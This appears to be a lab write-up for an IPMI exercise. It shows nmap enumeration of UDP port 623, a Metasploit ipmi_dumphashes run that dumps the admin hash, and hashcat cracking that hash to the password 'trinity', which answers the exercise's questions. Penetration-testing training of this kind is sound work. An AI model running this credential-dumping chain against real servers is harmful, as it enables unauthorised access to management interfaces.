### IPMI Exercise
 
IP: 10.129.77.209
 
---
 
### Question 1:
What username is configured for accessing the host via IPMI?
 
I start off with an nmap scan, using an ipmi-version script and targeting the port it runs on specifically to avoid a long wait scanning all UDP ports.
 
```diff
+ $ sudo nmap -A -sV -sC -p 623 -sU --script ipmi-version 10.129.77.209
```
 
	Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-29 16:40 EDT
	Nmap scan report for 10.129.77.209
	Host is up (0.080s latency).
	PORT    STATE SERVICE  VERSION
	623/udp open  asf-rmcp
	| ipmi-version:
	|   Version:
	|     IPMI-2.0
	|   UserAuth: password, md5, md2, null
	|   PassAuth: auth_msg, auth_user, non_null_user
	|_  Level: 1.5, 2.0
 
I then run the Metasploit ipmi_dumphashes module against the IPMI service.
 
```diff
+ msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
+ msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.77.209
+ msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```
 
	[+] 10.129.77.209:623 - IPMI - Hash found: admin:9aee926c820800000d166ec6330874ed0ff6f3ad1c16b65c6c529dde5f17d351edd5dd421eefef24a123456789abcdefa123456789abcdef140561646d696e:e11adfd5157099a3e360febeb4dae8aeb7369571
	[*] Scanned 1 of 1 hosts (100% complete)
	[*] Auxiliary module execution completed
 
From this I find the user admin, alongside their hash.
 
&#x1F6A9; found **admin**.
 
---
 
### Question 2:
What is the account's cleartext password?
 
I copy this hash to a file and pass it to hashcat to crack the hash using the rockyou wordlist.
 
```diff
+ $ hashcat -m 7300 ipmi.txt rockyou.txt
```
 
	9aee926c820800000d166ec6330874ed0ff6f3ad1c16b65c6c529dde5f17d351edd5dd421eefef24a123456789abcdefa123456789abcdef140561646d696e:e11adfd5157099a3e360febeb4dae8aeb7369571:trinity
 
Finally I have both the user and password, admin:trinity.
 
&#x1F6A9; found **trinity**.
